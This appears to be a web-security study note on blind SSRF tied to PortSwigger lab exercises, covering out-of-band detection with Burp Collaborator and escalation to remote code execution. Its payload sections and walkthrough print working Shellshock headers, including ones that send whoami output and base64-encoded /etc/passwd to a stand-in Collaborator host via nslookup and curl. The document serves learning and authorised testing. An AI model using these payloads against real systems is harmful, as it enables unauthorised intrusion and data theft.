# SSRF - Blind

The server fetches your URL but the **response isn't reflected**. Detect it out-of-band (Collaborator interaction), then escalate: sweep internal IPs for known vulns, or hit a vulnerable HTTP client/header (Shellshock) for **RCE**. Lower-impact than informed SSRF by default, but a route to full server compromise.

## Quick reference

```
# detect blind SSRF via OAST (put a Collaborator domain where a URL is fetched)
Referer: http://BURP-COLLABORATOR-SUBDOMAIN
# Collaborator -> "Poll now" -> DNS+HTTP interaction = vulnerable
# Shellshock RCE via a header the back-end CGI reflects into an env var:
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```
Decision list: URL fetched but no response shown -> fire a Collaborator payload in likely params/headers; got an interaction -> escalate (internal vuln sweep, Shellshock, client-side exploit of the HTTP stack).

## Root cause
Same as SSRF, but the front-end response doesn't include the back-end response, so you need a side channel (OAST). Escalation relies on the internal target being exploitable blindly (its own OAST, RCE, etc.).

## Find it (OAST)
- Use **Burp Collaborator** to mint a unique domain; place it in every candidate sink - URL params **and headers** (`Referer` is a classic: analytics software visits it).
- **Collaborator Everywhere** auto-injects the Collaborator domain into headers across your browsing to surface blind SSRF passively.
- Poll Collaborator. **DNS-only** interaction (no HTTP) is common - egress firewalls allow DNS but block unexpected HTTP; a DNS hit still proves the app tried to resolve your domain.

## Technique
**Detection:** inject the Collaborator domain (e.g. into `Referer`), send, poll -> DNS/HTTP interaction confirms blind SSRF.

**Escalation:**
- **Internal sweep:** blindly fire payloads at the internal IP space that themselves trigger OAST when a known vuln lands -> discover unpatched internal services.
- **Shellshock RCE:** if an internal/back-end CGI reflects a header into a Bash env var, send the Shellshock payload in a header (e.g. `User-Agent`) while pointing the SSRF at the internal host. The payload `() { :; }; <cmd>` executes `<cmd>`; exfiltrate output via OAST: `nslookup $(whoami).COLLAB`.
- **Malicious response / client exploit:** redirect the server's HTTP client to a host you control and serve a response that exploits a client-side bug in the server's HTTP stack -> RCE.

## Payload arsenal
```
# detect
Referer: http://COLLAB
stockApi=http://COLLAB
# Shellshock (in User-Agent, with SSRF aimed at internal host)
() { :; }; /usr/bin/nslookup $(whoami).COLLAB
() { :; }; /bin/bash -c 'id | curl http://COLLAB/$(cat /etc/passwd|base64)'
```

## Bypasses
| Blocker | Bypass |
|---|---|
| no response reflected | OAST (Collaborator) for detection |
| HTTP egress blocked, DNS allowed | rely on DNS interactions; exfil via DNS subdomain |
| can't read output | encode output into the OAST subdomain (`$(whoami).COLLAB`) |

## Exploitation walkthrough (Shellshock RCE)
1. Install **Collaborator Everywhere**, add the lab to scope, browse -> product page triggers a Collaborator interaction via `Referer`, and the interaction shows your `User-Agent` is reflected into the back-end request.
2. Send the product request to Intruder. Put a Shellshock payload in `User-Agent`: `() { :; }; /usr/bin/nslookup $(whoami).COLLAB`.
3. Set `Referer: http://192.168.0.§1§:8080` and sweep the octet so the back-end CGI host gets hit.
4. Poll Collaborator -> a DNS lookup of `<username>.COLLAB` reveals the executed `whoami` output -> RCE confirmed (lab solved).

## Chaining
- -> RCE / internal compromise; -> [XXE-injection](../../XXE-injection/) (blind SSRF via XXE OOB).
- OAST toolkit shared with blind [SQL-injection OAST](../../SQL-injection/Out-of-band-OAST/).

## Tools
- **Burp Collaborator** + **Collaborator Everywhere** (BApp), **Burp Intruder** (header injection + IP sweep), **Burp Repeater**.

## Labs

### Blind SSRF with out-of-band detection [Practitioner]
URL: /web-security/ssrf/blind/lab-out-of-band-detection
- Insert a Collaborator payload into the `Referer` header; send; poll Collaborator -> DNS+HTTP interaction confirms blind SSRF. Insight: analytics software visits the Referer; OAST is the detection channel.

### Blind SSRF with Shellshock exploitation [Expert]
URL: /web-security/ssrf/blind/lab-shellshock-exploitation
- Collaborator Everywhere reveals `Referer`-based SSRF + reflected `User-Agent`; inject Shellshock in `User-Agent` (`() { :; }; nslookup $(whoami).COLLAB`), sweep internal `Referer` IP; Collaborator DNS shows the command output -> RCE. Insight: blind SSRF + a vulnerable internal CGI = RCE, exfil via DNS.

Real-target transfer: when a URL is fetched but not shown, Collaborator-test every param/header; a DNS hit = blind SSRF; escalate via internal vuln sweeps / header-based RCE.

## Real-world notes
- Blind SSRF is extremely common (webhooks, link previews, PDF/image fetchers, analytics).
- DNS-only interactions still count and are reportable; full HTTP often blocked by egress rules.
- Shellshock is dated but the pattern (header -> server-side exec) generalizes to any internal command/template/deserialization sink.

## References
- https://portswigger.net/web-security/ssrf/blind
